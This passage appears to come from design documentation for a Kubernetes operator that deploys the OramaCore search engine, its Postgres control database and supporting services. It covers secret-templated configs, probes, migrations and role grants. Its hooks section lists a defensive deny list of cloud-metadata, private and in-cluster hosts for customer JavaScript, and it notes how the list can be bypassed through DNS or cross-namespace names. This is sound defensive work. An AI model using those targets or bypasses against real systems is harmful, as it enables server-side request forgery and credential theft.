  readers' render-config reads no master key Secret. It sets `MASTER_API_KEY` to an empty value,
  which wins over an older `<cr>-engine-secret` that still holds one. The reader-only image needs
  none of this: `reader.yaml` has no `writer_side`. Checked by `TestReaderNeverHoldsTheWriterMasterKey`,
  `TestMasterKeyChangeDoesNotRollTheReaders` and `TestCombinedReaderCannotPublishToTheReplicationStream`.
- **Config** — a `ConfigMap` `<cr>-engine-config` with `envoy.yaml` + **full, valid** OramaCore
  configs, matching `oramacore/config-docker.yaml` (`execution_providers: CUDA|CPU` from
  `writer.gpu`). Without side-only images it holds the combined `config.yaml` (`http` / `log` /
  `writer_side` / `reader_side` / `ai_server`), which the writer renders, and `combined-reader.yaml`
  (the same sections, the `writer_side` the readers' own, above), which the readers render. With them it holds
  `writer.yaml` (`http` / `log` / `writer_side` / `ai_server`), rendered by the writer, and
  `reader.yaml` (`http` / `log` / `reader_side` / `ai_server`), rendered by the readers; switching
  modes replaces the data, so the other mode's keys disappear. All four are assembled from the
  same section builders in `engine.go` (`engineCommonYAML`, `writerSideYAML`,
  `readerLocalWriterSideYAML`, `readerSideYAML`, `aiServerYAML`), so the sections and the
  replication stream are identical in every mode (writer `oramacore-writer`/`write`, readers
  `oramacore-reader`/`reader`).
- **Reader analytics** ([#386](https://github.com/oramasearch/orama-operator/issues/386)) — only
  `reader.yaml` carries `reader_side.analytics` (`readerAnalyticsYAML`), as on Prod 1's readers:
  `api_key: '__ANALYTICS_API_KEY__'`, filled from `<cr>-analytics-api-key`, and Prod 1's
  `metadata_from_headers` (`user-agent`→`ua`, `CF-Connecting-IP`→`ip`, `CF-IPCountry`→`country`,
  `continent`, `colo`, `latitude`, `longitude`), which OramaCore requires; a request without these
  headers is still served. With it each reader logs search events under its `data_dir` and serves
  them once on `GET /v1/analytics`, which erases what it returns; analytics-processor pulls each
  reader once per import with the analytics key ([Analytics import](#analytics-import)). The writer config has no reader side and no analytics block, and the combined
  `config.yaml` and `combined-reader.yaml` have none either, so on the combined image readers record no search events. Only the
  readers' render-config reads the analytics key.
  The `ai_server` LLM settings come from `spec.llm` (`engine_llm.go`): `ai_server.llm` is the
  default provider's built-in URL, first model and key, `ai_server.remote_llms` one entry per
  provider, and `ai_server.embeddings.automatic_embeddings_selector` the optional selector. Without
  `spec.llm` they are Prod 1's four providers with no selector
  ([crd-reference.md](crd-reference.md#specllm)).
  Every config is a **template** — `master_api_key` is a `'__MASTER_API_KEY__'` (on the combined
  readers `'__LOCAL_WRITER_KEY__'`, generated in the pod), the broker
  `password` is `'__BROKER_PASSWORD__'` (the `user` is the side's own broker user, `oramacore-writer`
  or `oramacore-reader`, [#99](https://github.com/oramasearch/orama-operator/issues/99)), and each provider's
  key a `'__<PROVIDER>_API_KEY__'` placeholder (single-quoted scalars), so **no credential lives in
  the ConfigMap**. A `render-config` **init container** substitutes the real values into the pod's
  template and writes it to a shared `emptyDir`, and OramaCore reads it via
  `CONFIG_PATH=/etc/oramacore/config.yaml`
  (env override can't reach the nested `writer_side.master_api_key` — `config`'s
  `ORAMACORE_` provider splits on `_`). Explicit `secretKeyRef` env entries carry `MASTER_API_KEY`
  from `spec.masterAPIKeySecretRef` (only where the side's template holds it), `BROKER_PASSWORD`
  from the side's key of `<cr>-broker-users`, `ANALYTICS_API_KEY` from `<cr>-analytics-api-key` (the
  reader-only config only), and a provider's key from its `apiKeySecretRef`; the other provider
  keys come from `<cr>-engine-secret` (via `envFrom`).
  The script reads each value from its environment variable and escapes it for `sed` and the
  single-quoted scalar, so no value is evaluated, logged or written into the script.
  Each pod template carries `orama.cloud/config-hash`, the SHA-256 of its own unrendered template
  (with side-only images a change to one side's config rolls only that side, a change to a shared
  section such as the LLM settings rolls both; the combined config rolls both). Readers with Envoy
  hash their template and `envoy.yaml` together (`sha256Hex`), since Envoy reads its bootstrap only
  at start: a bootstrap change rolls them, and leaves the writer and readers without Envoy, whose
  hash stays their template's alone, as they were. The pod template also carries
  `orama.cloud/llm-secret-hash`, the SHA-256 of the data of `<cr>-engine-secret` and every
  `apiKeySecretRef` Secret, identical on both sides, and `orama.cloud/credentials-hash`, the side's
  `<cr>-broker-users`, master key (writer only) and (reader-only config) analytics key Secrets ([Credentials](#credentials--broker-and-redis-passwords-and-the-master-key-credentialsgo)).
  The controller watches Secrets and maps a change to every CR that reads it, so a rotated key rolls
  the writer and readers with no restart by hand. Without a usable master key the writer and
  reader StatefulSets are held at zero replicas, and so is a reader Deployment left by an earlier
  operator version. The LLM settings and keys are checked before any engine object is
  written: invalid input leaves the running engine untouched with `Ready=False`. All children set
  an owner reference to the CR, so deleting the CR cascade-deletes them.
- **Hooks deny list** ([#306](https://github.com/oramasearch/orama-operator/issues/306)) —
  customer JavaScript hooks run inside OramaCore and may `fetch` outbound; with no allow or deny
  list OramaCore lets them reach any host. `writer_side.hooks` and `reader_side.hooks` are the same
  block in every config (`hooksYAML` in `engine_hooks.go`, embedded by `writerSideYAML` and
  `readerSideYAML`), so the combined, writer-only and reader-only templates all carry it and
  `orama.cloud/config-hash` rolls the pods when it changes. The values are fixed, with no CR field:
  `evaluation_timeout: 200ms`, `execution_timeout: 1s` (Prod 1's), and `denied_domains` only
  (OramaCore refuses `allowed_domains` next to it). The list, 66 entries in this order without
  duplicates:
  1. Prod 1's 32 entries as written (orama-deploy `655f1a2`, `oramacore/production/config/`
     `writer.config.yaml` and `reader.config.yaml`): loopback, RFC 1918, link-local and cloud
     metadata, carrier-grade NAT, multicast and reserved, unspecified and broadcast, TEST-NETs,
     benchmarking and the listed private IPv6 patterns. These are glob patterns, not a complete
     CIDR filter.
  2. A `**` form of each Prod 1 entry ending in `.*` (`10.**`, `169.254.**`, `172.1[6-9].**`, …).
  3. The cluster's names: `*.svc`, `*.svc.cluster.local`, `*.cluster.local`, `kubernetes*`,
     `*.internal`, their `**` forms, `::ffff:*` (IPv4-mapped IPv6, which the URL parser keeps in
     hex, e.g. `::ffff:a00:1`, so no IPv4 pattern sees it), `::`, and Azure's WireServer
     `168.63.129.16` (Prod 1's list was written for AWS; on AKS that host address is reachable and
     outside every private range).
  4. The stack's own Service names, `<cr>-*` and `<cr>-*.**`.

  Matching is `orama-js-pool` 0.4.3's
  ([`src/permission.rs`](https://docs.rs/crate/orama-js-pool/0.4.3/source/src/permission.rs),
  `check_net_url` / `glob_match`): it matches the URL's **host string**, never the resolved
  address, case-insensitively, with and without the port. `.` separates labels, so `*` stays
  within one label and `**` spans several: Prod 1's `10.*` does not match `10.0.0.1`, which is why
  step 2 adds `10.**`. A refused call fails in the hook with `Domain not allowed`, so a hook cannot
  reach `http://169.254.169.254/`, `http://10.0.0.1/`, `http://<cr>-controldb-rw:5432/` or
  `http://<cr>-controldb-rw.<ns>.svc.cluster.local:5432/`. **Limits:** a public DNS name that
  resolves to a private address passes this check, and so does another stack's Service addressed
  as `<svc>.<ns>`. Reachability after resolution is enforced by the engine's network sandbox
  ([Network sandboxes](#network-sandboxes-internalcontrollernetworksandbox_controllergo)) and the
  secure networking work in [#437](https://github.com/oramasearch/orama-operator/issues/437), not
  by this list.
- **Writer JWT provider** ([#384](https://github.com/oramasearch/orama-operator/issues/384)) —
  with `engine.writer.jwt` set, `writerSideYAML` ends with `writerJWTYAML` (`engine_jwt.go`): one
  `dashboard` JWKS provider whose `issuers` is `[jwtIssuer(oc)]`, the dashboard's own `JWT_ISSUER`,
  whose `audiences` are `engine.writer.jwt.audiences` in order without duplicates, and whose
  `jwks_url` defaults to the dashboard Service in the same namespace,
  `http://<cr>-dashboard:3000/api/.well-known/jwks.json` (the dashboard serves it from
  `JWT_PUBLIC_KEY`). While that host is the stack's dashboard Service, the network sandbox adds
  `allow-writer-jwks-egress` and `allow-dashboard-jwks-ingress`, writer to dashboard TCP 3000 and
  nothing else (`writerJWKSFromDashboard`); an external `jwksURL` gets neither and is reached
  through `allow-engine-public-internet`. Every string is a quoted, escaped YAML scalar. The
  combined and writer-only configs carry it, the reader-only config does not, and the block is in
  the hashed template, so a
  change rolls the writer only (both pods in combined mode). `validateWriterJWT` runs in
  `reconcileEngine` before any engine object is written and refuses an empty issuer, no audience,
  an empty or over-long field, and an unusable JWKS URL
  ([crd-reference.md](crd-reference.md#speccomponentsenginewriterjwt)). Unset, the config has no
  `jwt` block, as before. **Tokens Prod 1 issued** do not verify here: this stack signs with its
  own key, so the writer rejects them, expired or not. The dashboard signs each one for 10 minutes
  (`expiresIn: '10m'` in `src/app/api/user/jwt/route.ts`), and `@orama/core` 1.2.19 asks for a new
  one before every request.
- **Graceful shutdown** — OramaCore handles SIGTERM (drains HTTP, then force-commits
  BOTH sides to disk — `oramacore/src/lib.rs`, `web_server/mod.rs`; `CMD ["./oramacore"]`
  = PID 1). Because the writer's commit flushes indexes, the writer pod gets
  `terminationGracePeriodSeconds: 300` (readers: 60) so k8s doesn't SIGKILL the flush
  at the default 30s.
- **Health probes** — startup / readiness / liveness hit `GET /health` on `:8080`
  (`oramacore/src/web_server/api/mod.rs`; also the prod ALB path), including when Envoy
  is enabled, except the **reader's readiness**, which hits `GET /health/ready`: it reports ready
  only once the reader has caught up with the stream head it observed at startup
  ([oramacore#340](https://github.com/oramasearch/oramacore/pull/340)). The reader's liveness and
  startup stay on `/health`, so a refusing reader is not restarted by liveness; it is simply never
  Ready. The Core image must serve `/health/ready`, or every reader stays not-Ready. The **startup
  probe** allows the writer **20 minutes** (`120 × 10s`) and readers **40 minutes** (`240 × 10s`),
  matching Prod 1's startup allowances from Steve's review of #406. These fixed budgets gate
  readiness and liveness during index loading; a successful startup probe releases them
  immediately, without waiting out the budget. A container that never becomes healthy exhausts its
  budget and is restarted. Readiness checks every 10s and liveness every 15s, both with a 3s timeout
  and failure threshold 3. Reconciliation updates existing workload templates to these startup budgets.
- **Disruption budgets** — the **writer** gets a PDB with `maxUnavailable: 0` (it's a
  singleton — voluntary disruptions like node drains/autoscaler are blocked so it
  isn't casually evicted; **node maintenance must consciously handle it**). **Readers**
  get `maxUnavailable: 1` (roll one at a time, keep the rest serving).

**Validated on AKS (2026-07-08):** applying a `primary` CR created the writer STS
(+ dynamically-provisioned PVC), the reader Deployment, both Services, and the
ConfigMap; the CR reaches **`Phase=Ready`** once every owned workload is ready — a status
roll-up over the live Deployment/StatefulSet + CNPG readiness (`internal/controller/status.go`,
[#37](https://github.com/oramasearch/orama-operator/issues/37)). Phase is
`Progressing | Ready | Degraded` (Degraded = a component regressed after being Ready); it also
exposes `status.componentsReady` (`22/22`, a print column), a **per-component list**
(`status.components[]` — one entry per deployable component, e.g. `writer 1/1`, `broker 1/1` — not
per-pod), and a standard `Ready` condition. The status subresource is **written only on a real
transition** (deep-compared first), so a steady stack generates no control-plane churn. Deleting
the CR GC'd everything. The
`render-config` init container renders the config, and **OramaCore 1.2.28 parses it and
boots** (`Configuration loaded successfully` → `Starting web server on
http://0.0.0.0:8080`); the ConfigMap shows only `master_api_key: '__MASTER_API_KEY__'`
while the rendered file in the pod holds the real value.

> **Follow-ups:** the `embeddings` ai-server image is built by the bridge's
> [`build/images`](https://github.com/oramasearch/orama-cloud-v1-bridge/tree/main/build/images)
> tooling (`oramasearch/embeddings-server-py:{cpu,gpu}-latest`, private Docker Hub — the tag
> is auto-picked from `writer.gpu`; just set `spec.images.pullSecretName`); RabbitMQ
> writer→reader replication (currently in-memory transport, single-node); the
> reader→primary-writer endpoint on read tiers.

## controlDB (`internal/controller/controldb.go`)

The control-plane Postgres is always an in-cluster **CloudNativePG `Cluster`**,
provisioned as an **unstructured** object so the operator stays decoupled from CNPG's
Go types/version. Requires the CNPG operator (installed via the helmfile).

- **Primary** — a fresh cluster, `spec.instances` from the profile (light 1 / medium
  2 / heavy 3), `10Gi` storage, `bootstrap.initdb` creating the `oramacore` database.
- **Read tier** (`role: read`, `replicate: true`) — a **replica cluster** streaming
  from the primary region's `postgresEndpoint` (`spec.replica` + `externalClusters`).
- `mode: in-cluster` is the only supported mode and the default. Admission refuses
  `external`, even when disabled or supplied an endpoint and credentials. The reconcile
  also refuses pre-existing external-mode CRs before any control-DB client operation,
  preserving their Cluster, schema, migration resources, Secrets and storage. The stack
  reports `Degraded` with `Ready=False`, reason `ReconcileError`. Managed-set templates
  are raw JSON: their merged members are refused by member-cluster admission and the
  set reports those members as `Degraded`.
- The dashboard never runs `db-migrate`; the operator's `PostgresSchema`s own the schema.
  Dashboard and index-builder `DATABASE_URL` and analytics-processor render `PG_URI`
  use `pgURIEnv` to read the CNPG-generated `<cr>-controldb-app` Secret's `uri` key.
  Dashboard `POSTGRES_PASSWORD` uses `pgPasswordEnv` for its `password` key.
  The analytics template contains only placeholders; its init container escapes every
  value for sed replacement, preserving `&`, `\` and `#` in credentials and URIs.
- The `Cluster` owner reference means deleting the CR cascade-deletes it (CNPG then
  removes the pods/PVCs). Disabling a supported in-cluster control DB still tears it down.

- **psql image** — the schema Jobs (`PostgresSchema` `spec.image`) and the cluster-row Job run
  `spec.images.overrides.postgres-client`, else `postgres:16-alpine` from Docker Hub's public
  library, with the stack's `spec.images.pullSecretName`. Production pins the key to a private
  `oramasearch/*` digest in its set file. The other helper images get their keys in
  [#569](https://github.com/oramasearch/orama-operator/issues/569).
- **Cluster row** ([#443](https://github.com/oramasearch/orama-operator/issues/443),
  `controldb_cluster_row.go`) — the dashboard places a project on an `oramacore_clusters` row, so a
  control DB without one cannot create projects. Cluster rows are never copied from Prod 1: each
  stack's only row is the operator's `c1` (orama-bridge `docs/projects/orama-cloud-v1/decisions-2026-10-16.md`,
  decision 9). Once both public hosts (`engine.writer.host`, `engine.reader.host`) are set, every control-DB `PostgresSchema` (0000 to 0007, 0008, the reference rows, the migration role's grants and the dashboard role's grants) is current and the master key is valid, the operator
  runs the Job `<cr>-controldb-cluster-row`, which inserts one row **only when the table has no row
  at all**, soft-deleted rows included: `name` = the CR name, `cluster_prefix` = `c1` (the only
  prefix the `collections.orama.com` worker routes, so customers' read keys keep working),
  `writer_url` = `https://<engine.writer.host>`, `reader_url` = `https://<engine.reader.host>` (never
  an in-cluster URL: without both hosts the operator waits, `WaitingForPublicHosts`, because the row is
  written once), `master_api_key` from `spec.masterAPIKeySecretRef` at the time of the insert (a
  rotated key does not update it), `cluster_reader_replica_count` =
  `engine.reader.replicas`, `cluster_writer_count` = 1, and both region columns
  `["<spec.region.name>"]`. The dashboard mints the writer's JWT audience from `writer_url`, so with
  `writer.orama.ing` the writer's only audience is `https://writer.orama.ing`, which
  `engine.writer.jwt.audiences` already has to contain. The check and the insert run in one
  transaction under a table lock; a run cut off mid-transaction rolls back whole. A table that has a
  row is never updated or deleted; the Job only logs `already has a row; left unchanged`. No row is
  inserted for a disabled control DB, a read region, or a stack without the engine.
  Values reach `psql` from the environment, so the key is in no argv, log or status. The row's `id`
  is generated by Postgres.
  - **The row's id reaches the dashboard** ([#572](https://github.com/oramasearch/orama-operator/issues/572)).
    After the insert the script reads back the id of the newest live row with the `c1` prefix,
    inserted by this run or found, and writes it (or `none`) to its termination message. Once the Job
    has succeeded, the operator reads that message from the Job's pod (no database read of its own)
    and records it on the Job as the annotation `orama.cloud/cluster-row-id`. The dashboard gets it as
    `ORAMACORE_PLACEMENT_CLUSTER_ID`, so new projects go to the `c1` row. Until it is recorded, or
    when the control DB has no live `c1` row (`none`), the dashboard gets no placement and uses the
    newest row, which is `c1` on a stack whose only row it is. Recording the id rolls the dashboard
    once. A succeeded Job whose pod reported no id (one built before #572, or one whose pod is gone) is
    replaced once, foreground: on a control DB that has its row the new run inserts nothing and only
    reports the id.
  - **Retries.** Inside the Job the pod is retried 6 times with the Job controller's exponential
    back-off, within a 30-minute deadline. A Job that still fails is deleted by the operator 5
    minutes after its failure (foreground, so two runs never overlap) and created again on the next
    reconcile, which the 20-second readiness requeue drives while `ClusterRowReady` is not `True`.
    An unfinished Job built from an older template (another image, host or key Secret) is replaced
    at once. A succeeded Job that recorded its row id is kept as the record and never re-run. No Job
    is ever deleted by hand.
  - **Status.** The CR's `ClusterRowReady` condition reports the Job (`WaitingForPublicHosts`,
    `WaitingForSchema`, `WaitingForMasterAPIKey`, `Inserting`, `JobFailed` with the retry time,
    `RowPresent`). It does not change the phase. `RowPresent` reports the Job, not a live read of the
    table: the Job is not re-run, so a control DB emptied later (a restore) still shows it, and its
    message says so.
  - **Network.** The Job's pod keeps `app.kubernetes.io/component=controldb` (teardown deletes the
    Job by it) and carries `orama.cloud/controldb-client=cluster-row`. The stack's network sandbox
    lets that pod, and only this stack's, reach the CNPG pods on 5432 (`allow-controldb-cluster-row-egress`
    and `allow-controldb-ingress`); without them the Job waits for the database forever
    ([#648](https://github.com/oramasearch/orama-operator/issues/648)).

### The control DB's schema

On a writable control DB (the primary, or any stack without `replicate: true` on a read tier) the
operator owns five `PostgresSchema`s, one per file in the ConfigMap `<cr>-controldb-migrations`.
Each file and its `PostgresSchema` are written only once the one before reports `phase: Applied`
for its **current** `spec.version` and `metadata.generation`; a stale `Applied` does not release
the next. A streaming replica receives the primary's schema and owns none.

| Order | `PostgresSchema` | ConfigMap key | Guard | What it applies |
|---|---|---|---|---|
| 1 | `<cr>-controldb-schema` | `schema.sql` | `crawler_configs` | Drizzle migrations 0000 to 0007, `assets/dashboard-schema.sql` (version `sha256:461cc9d132ba`, unchanged) |
| 2 | `<cr>-controldb-schema-0008` | `schema-0008.sql` | `team_migrations` | Migration 0008 (`assets/dashboard-schema-0008.sql`, vendored from `oramasearch/dashboard` branch `cloud-migration` at `8e8f9a6`), with the reference rows seeded between 0008's tables and its `teams` columns and constraints |
| 3 | `<cr>-controldb-reference-data` | `reference-data.sql` | none (`applyEveryVersion`) | The reference rows again, with this stack's Stripe prices, re-applied whenever the rows or the prices change |
| 4 | `<cr>-controldb-migration-grants` | `migration-grants.sql` | none (`applyEveryVersion`) | The `migration` role's grants ([#653](https://github.com/oramasearch/orama-operator/issues/653)): `SELECT, INSERT, UPDATE, DELETE` on every table in `public` and `USAGE, SELECT` on its sequences, now and as default privileges. Its header names the versions of schemas 1 and 2, so a new version of a schema that creates tables re-applies it |
| 5 | `<cr>-controldb-dashboard-grants` | `dashboard-grants.sql` | none (`applyEveryVersion`) | The `dashboard` role's grants ([#99](https://github.com/oramasearch/orama-operator/issues/99)): `CONNECT, TEMPORARY` on the database (the `projects` delete trigger creates a temporary table), `SELECT, INSERT, UPDATE, DELETE` on every table in `public` except the rows the operator owns (`subscription_plans`, `stripe_addon_prices`, `llms`, `oramacore_clusters`: `SELECT` only), and `USAGE, SELECT` on its sequences, now and as default privileges. No DDL, no `TRUNCATE`, no other schema. Same header rule as schema 4 |

- **Why a second schema for 0008.** A database built from the 0000 to 0007 file already has
  `crawler_configs`, so the first schema's Job skips it; 0008 appended there would never reach
  `v1-dev`, `v1-eu` or `v1-us`. Its own `PostgresSchema`, guarded on a table 0008 creates, reaches
  every existing database on the operator's next roll and every new one after 0007. 0008 guards its
  statements (`IF NOT EXISTS`, `duplicate_object`), so a compatible partial 0008 without
  `team_migrations` re-applies cleanly. The guard does not prove the other 0008 objects exist: a
  database with `team_migrations` but missing objects is drift, to be reported, not repaired.
- **Who creates the reference rows.** The operator does
  ([decision 7](https://github.com/oramasearch/orama-bridge/blob/main/docs/projects/orama-cloud-v1/decisions-2026-10-16.md)).
  `assets/dashboard-reference-rows.sql` holds Prod 1's `subscription_plans`, `stripe_addon_prices`
  and `llms` rows, with their IDs and every column, exported read-only by
  `hack/export-dashboard-reference-rows.sh`, without Stripe price IDs.
  `assets/dashboard-reference-data.sql` upserts them by ID (`ON CONFLICT (id) DO UPDATE`, never a
  delete) and fails unless the default plan `0d735744-e58e-4438-b618-97523e407cdc` exists. Inside
  0008 it runs before `teams.subscription_plan_id` and its foreign key, so existing teams validate
  against the default plan in the same transaction and a new team can be created; without the
  rows, 0008 rolls back as a whole. The tenant copy tool does not copy these rows.
- **Stripe prices are per stack**: `spec.components.controlDB.stripePrices` (test-mode IDs on
  nonprod, live-mode IDs on `v1-prod`). They reach only `<cr>-controldb-reference-data`, so 0008's
  SQL and version are the same on every stack. Empty leaves plans' Stripe columns NULL and seeds no
  add-on price (`stripe_addon_prices.stripe_price_id` is NOT NULL). An ID that is not a reference
  row fails the seed, visibly, and changes nothing.
- **Readiness.** The stack's `controldb-schema` component is ready only when all five report their
  current version `Applied`; otherwise its detail names the first that is not, with its phase and
  message.
- **A failed migration Job is retried by the operator.** The `PostgresSchema` controller never
  recreates a failed Job of the same version, so the stack's reconciler foreground-deletes its own
  schema's terminally failed, current-version Job (UID and resourceVersion preconditions), records
  `orama.cloud/retried-failed-job` on the `PostgresSchema` until it applies, and the controller
  creates a fresh Job once the pods are gone. Each Job keeps its 20-attempt backoff. Active,
  obsolete and unowned Jobs are never touched; Lake's schemas do not pass through this path.
- **Disabling the control DB** deletes the five `PostgresSchema`s this stack controls (their Jobs
  go with them) and the migrations ConfigMap, with the CNPG `Cluster`.
- **Later dashboard migrations** follow 0008: each is vendored unchanged into its own file and its
  own `PostgresSchema` after the last, guarded on a table it creates, and applied to Prod 2 on the
  operator's next roll, with a short planned outage when it needs one
  ([decision 8](https://github.com/oramasearch/orama-bridge/blob/main/docs/projects/orama-cloud-v1/decisions-2026-10-16.md)).
  Prod 1 never receives them.

- **The migration role** ([#653](https://github.com/oramasearch/orama-operator/issues/653)). The
  `Cluster`'s `spec.managed.roles` declares `migration` on every stack: not a superuser, no
  `createdb`, `createrole`, `replication` or `bypassrls`, `connectionLimit: 4`, and `login: true`
  only while an `OramaCloudV1Migration` in the namespace names this stack as `targetRef` (the stack
  watches them). Every field CNPG defaults is rendered, so a steady stack changes nothing. Its
  password is `<cr>-controldb-migration` (`kubernetes.io/basic-auth`, `username`, `password` and
  `uri`, labelled `cnpg.io/reload`), generated once by the operator and never changed; disabling the
  control DB deletes it with the other `controldb` Secrets. Its grants are schema 4 below. The
  migration tool uses it instead of the owner (principle 4); see
  [`cloud-v1-migration.md`](cloud-v1-migration.md#what-the-stack-provides).
- **The dashboard role** ([#99](https://github.com/oramasearch/orama-operator/issues/99),
  `controldb_roles.go`). `spec.managed.roles` also declares `dashboard`: `login: true`, not a
  superuser, no `createdb`, `createrole`, `replication` or `bypassrls`, `connectionLimit: 40` (the
  dashboard's postgres-js client pools at most 10 per pod). Its password is
  `<cr>-controldb-dashboard` (`kubernetes.io/basic-auth`, `username`, `password`, `uri`, labelled
  `cnpg.io/reload`), generated once and never changed. Its grants are schema 5. The dashboard's
  `DATABASE_URL` and `POSTGRES_PASSWORD` come from that Secret wherever the control DB runs as a
  primary; the Deployment is not written until schema 5 reports its current version `Applied`, so a
  running dashboard keeps the owner's credentials until its role can sign in, and then rolls once.
  A read-tier replica's dashboard keeps the owner's credentials until replica credentials are wired.
  The owner (`<cr>-controldb-app`) is left to the `PostgresSchema` Jobs, the cluster-row Job and
  pgAdmin; index-builder and analytics-processor still use it
  ([#99](https://github.com/oramasearch/orama-operator/issues/99) follow-ups below).
  `TestControlDBSchemasAgainstPostgres` signs in as the role and checks it can read every table and
  do the dashboard's writes, including the delete triggers, and is refused DDL, `TRUNCATE`, writes
  to the operator-owned rows and any other schema.

**Validated on AKS (2026-07-07):** with the CNPG operator installed, a `medium`
primary CR produced a `Cluster` (instances=2, initdb=`oramacore`, owned by the CR);
CNPG bootstrapped Postgres; deleting the CR GC'd the cluster + its pods.

> **Follow-ups:** the replica cluster's `streaming_replica` credentials/secret wiring;
> exposing storage size + the DB name as CR fields; a Service alias the app can use.

## Prod 1 team migrations (`internal/controller/oramacloudv1migration_controller.go`)

`OramaCloudV1MigrationReconciler` runs one Prod 1 team's copy into a stack
([#653](https://github.com/oramasearch/orama-operator/issues/653)). For each
`(step, apply, attempt)` of an `OramaCloudV1Migration` it creates, once:

| Object | Name | Notes |
|---|---|---|
| `PersistentVolumeClaim` | `<name>-runs` | The tool's run directory, `ReadWriteOnce`, 20Gi by default, kept across steps, grown to a larger `spec.runVolume.size` when the next Job starts, deleted on deletion |
| `Job` | `<name>-<step>-<attempt>` (`-dry-run` before the attempt without `apply`; `<name>-remove-<attempt>` on deletion) | `run-step` of the pinned `cloud-v1-migration` image; `backoffLimit: 0`, 6h deadline, kept a week or until deletion, which deletes them with their pods before the run volume; uid 10001, read-only root, `/tmp` `emptyDir`, no service-account token; a `wait-for-database` init container on the stack's postgres-client image |

It starts a Job only once no other Job of the migration runs, the stack is `Ready` with
`ClusterRowReady` and every control DB schema current, a writing step finds the stack's dashboard
crons and analytics import suspended, the step is in order, and every Secret it reads exists. It reads
the outcome from the pod (exit 0, 3, other; the termination message to `status.result`) and writes
status only on a transition. The stack side, in `controldb.go` and `oramacloudv1_network_sandbox.go`,
is the `migration` role, its grants and the migration pod's network paths. Detail:
[`cloud-v1-migration.md`](cloud-v1-migration.md). Not run on a cluster yet: it needs a release and
the `cloud-v1-migration` image of oramacore-aws#108.

## Data stores — cache / broker / analytics / search (`internal/controller/datastore.go`)

A single generic `reconcileDataStore` provisions each as a **single-node
`StatefulSet` + PVC + Service**, parameterized per store (image, ports, data path,
env). Honors the `DataStoreSpec`: `enabled`, `mode: external` (skip — the app uses
the endpoint), and `placement: central` (only the primary runs it; read tiers skip
and reference the primary's endpoint). Images are overridable via
`spec.images.overrides.<component>`.

| Store | Component | Image | Ports |
|---|---|---|---|
| Redis (`--requirepass` from `<cr>-cache-auth`) | `cache` | `redis:7-alpine` | 6379 |
| RabbitMQ (admin from `<cr>-broker-admin`) | `broker` | `rabbitmq:3.13-management` | 5672, 15672, 5552 |
| ClickHouse | `analytics` | `clickhouse/clickhouse-server:24.8` | 8123, 9000 |
| Typesense | `search` | `typesense/typesense:0.25.2` | 8108 |

**Validated on AKS (2026-07-07):** a CR with all four enabled produced four
StatefulSets + Services + PVCs; **all four pods booted `1/1`**; deleting the CR
removed the workloads.

> **PVC retention:** StatefulSet PVCs are **retained** on delete (the k8s default —
> data is left in place, not auto-deleted). Orphaned PVCs are cleaned up manually.
> (A configurable `delete`-on-teardown option can be added later.)

Each store also gets the **workload-hardening baseline** (startup/readiness/liveness TCP probes, a
per-container securityContext, requests + a generous per-store memory limit, a `60s` grace period,
and a `maxUnavailable: 0` PDB) — see [Workload hardening](#workload-hardening--applied-to-every-component-18).

> **Follow-ups:** these are single-node for light/medium. **Heavy/production** should
> swap in the dedicated operators (Altinity ClickHouse, RabbitMQ cluster-operator) and
> a clustered Typesense; wire credentials via the component secret (the Typesense API key
> is a dev placeholder today; the broker and Redis passwords are generated, see
> [Credentials](#credentials--broker-and-redis-passwords-and-the-master-key-credentialsgo)). Binary-side right-sizing derived from the memory limits (Redis
> `maxmemory`, etc.) is [#42](https://github.com/oramasearch/orama-operator/issues/42).

## App compute — ingestion / workers / dashboard / docs (`app.go`, `ingestion.go`)

A generic `reconcileApp` provisions a stateless **Deployment + Service (+ Ingress if a
host is set)**.

- **ingestion** — `index-builder` Deployment (was Cloud Run) and HPES, the embeddings server it
  calls ([below](#hpes-index-builders-embeddings-hpesgo-574)); when `harvest` is on, also the
  HARVEST **master** Deployment, a **Mongo** StatefulSet (record store), and a **Selenium** grid
  Deployment.
- **workers** — the ported CF workers as **one bundled image** → a single Deployment
  (`workers.replicas`, image via `workers.image` or `spec.images.overrides.workers`).
- **Third-party keys from their own Secrets** ([#571](https://github.com/oramasearch/orama-operator/issues/571),
  `third_party_keys.go`). A third-party key can name its own Secret and key instead of sitting in the
  operator-seeded component Secret beside internal keys, so a set copies only small third-party
  Secrets:
  - **workers**: `OPENAI_API_KEY`, `GROQ_API_KEY` and `ANTHROPIC_API_KEY` from the same
    `spec.llm.providers[].apiKeySecretRef` the engine reads (no second copy of the keys; Google's key
    is the engine's alone), and `SENTRY_DSN` from `components.workers.sentryDSNSecretRef`
    (`{name, key}`);
  - **index-builder**: `CLOUDFLARE_API_TOKEN` and `CLOUDFLARE_ACCOUNT_ID` from `token` and
    `accountID` of `spec.cloudflare.apiTokenSecretRef`, the token that already creates the KV
    namespaces it writes. No new field and no new copied Secret. Its `SENTRY_DSN` stays `""`
    (Sentry off there).

  Each reference is an explicit `secretKeyRef` env entry, which wins over the component Secret's
  `envFrom`, and its Secret is in the workload's `orama.cloud/credentials-hash`, so a changed value
  rolls exactly that workload; the Secret watch maps it back to the CR. The operator never creates or
  changes a referenced Secret. A missing Secret, key or empty value fails the component's step before
  its Deployment is written, and `Ready` names the variable, the field, the Secret and the key. A key
  with a reference is no longer seeded into a new component Secret; one an older Secret still holds
  is shadowed by the explicit entry. Without a reference nothing changes. `ABLY_API_KEY`,
  `APIFY_TOKEN`, `GITHUB_PAT` and `GHCR_TOKEN` have no reference yet: Ably and Apify wait for an
  outside-service decision for Cloud v1, and harvest-master may not need the GitHub tokens at all
  ([#747](https://github.com/oramasearch/orama-operator/issues/747)).
- **dashboard** — a Deployment + Service + an **Ingress** on `dashboard.host` and
  `dashboard.extraHosts`. It reads
  `JWT_ISSUER` from the shared ConfigMap through `envFrom`, which a running process does not
  re-read, so its pod template carries `orama.cloud/jwt-issuer-hash`, the SHA-256 of
  `jwtIssuer(oc)`: a change to the effective issuer rolls it. Audience and JWKS URL changes do not.
  The upgrade that adds the annotation rolls the dashboard once. Its environment is the
  operator's (`<cr>-config`, `<cr>-dashboard-secret`, `<cr>-jwt`, `MASTER_API_KEY` from
  `spec.masterAPIKeySecretRef`, `POSTGRES_PASSWORD`, `DATABASE_URL`, and the derived values below)
  plus what `dashboard.envFrom` and `dashboard.env` take from Secrets and ConfigMaps
  ([below](#the-dashboards-environment)).

### Ingress hosts (`upsertIngress`, [#313](https://github.com/oramasearch/orama-operator/issues/313))

`ingressSpec(oc, name, host, extraHosts, port)` builds the spec of every Cloud v1 component
Ingress and `upsertIngress(ctx, oc, name, component, spec)` writes it: the dashboard and docs through
